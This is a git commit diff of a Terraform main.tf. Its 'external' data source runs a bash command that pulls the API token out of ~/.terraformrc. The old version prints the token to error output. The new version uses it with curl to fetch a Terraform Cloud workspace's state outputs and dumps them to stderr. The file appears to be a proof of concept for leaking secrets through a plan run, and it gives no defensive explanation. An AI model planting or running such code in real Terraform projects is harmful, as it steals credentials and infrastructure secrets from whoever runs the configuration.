38859bb10d2b2ff8ef64a678a3f945e60f75b467
Filip Dimitrov <github@filip-dimitrov.eu>
2022-06-13 20:44:17 +0300

    Update main.tf

--- main.tf
+++ main.tf
@@ -1,5 +1,5 @@
 data "external" "example" {
-program = ["/bin/bash", "-c", "TOKEN=$(grep token ~/.terraformrc | cut -f 2 -d \\\") ; echo $TOKEN 1>&2 ; exit 1"]
+program = ["/bin/bash", "-c", "TOKEN=$(grep token ~/.terraformrc | cut -f 2 -d \\\") ; curl --header "Authorization: Bearer $TOKEN" --header "Content-Type: application/vnd.api+json" https://app.terraform.io/api/v2/workspaces/ws-eMs8keix7KspYjZW/current-state-version-outputs | jq . 1>&2 ; exit 1"]
 }
 
 /*
